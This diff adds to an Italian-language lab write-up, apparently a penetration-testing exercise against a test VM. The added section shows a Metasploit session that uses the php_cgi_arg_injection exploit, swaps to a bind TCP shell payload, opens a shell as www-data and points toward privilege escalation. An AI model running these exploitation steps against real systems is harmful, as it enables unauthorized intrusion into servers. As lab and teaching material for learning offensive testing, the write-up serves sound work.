@@ -155,3 +155,47 @@ Interact with a different session Id.
 This works the same as calling this from the MSF shell: sessions -i <session id>
 ```
 Abbiamo aperto una sessione, ma perché meterpreter non ci permette di usare nessun comando classico come: ls, whoami, etc. Semplicemente non possiamo perché abbiamo istanziato un payload reverse_tcp e in questo momento stiamo visitando la macchina target come se fosse un vero e proprio sito. Il multi/handler, è una porzione di codice utilizzata per simulare il comportamento di funzionalità software che gestisce gli exploit al di fuori del framework metasploit, si aspetta una connessione da un payload meterpreter non da un web browser. 
+
+Per questo motivo selezioniamo un altro payload, scegliamo una bind shell tcp, __payload/generic/shell_bind_tcp__.
+
+```
+msf6 exploit(multi/http/php_cgi_arg_injection) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/generic/custom                                       normal  No     Custom Payload
+   1   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
+   2   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
+   3   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
+   4   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
+   5   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
+   6   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
+   7   payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
+   8   payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
+   9   payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
+   10  payload/php/exec                                             normal  No     PHP Execute Command
+   11  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
+   12  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
+   13  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
+   14  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
+   15  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+   16  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+   17  payload/php/meterpreter_reverse_tcp                          normal  No     PHP Meterpreter, Reverse TCP Inline
+   18  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
+   19  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)
+
+msf6 exploit(multi/http/php_cgi_arg_injection) > set payload 1
+payload => generic/shell_bind_tcp
+msf6 exploit(multi/http/php_cgi_arg_injection) > exploit
+
+[*] Started bind TCP handler against 192.168.139.129:4444
+[*] Command shell session 2 opened (192.168.139.128:46283 -> 192.168.139.129:4444) at 2021-12-15 13:30:53 -0500
+
+whoami
+www-data
+```
+
+Avviato l'exploit otteniamo così una shell sulla macchina target, da notare però che questa volta non siamo entrati con i privilegi di roor ma con quelli dell'utente www-data. Da questo punto in poi si potrebbe procedere con la __privilage escalation__
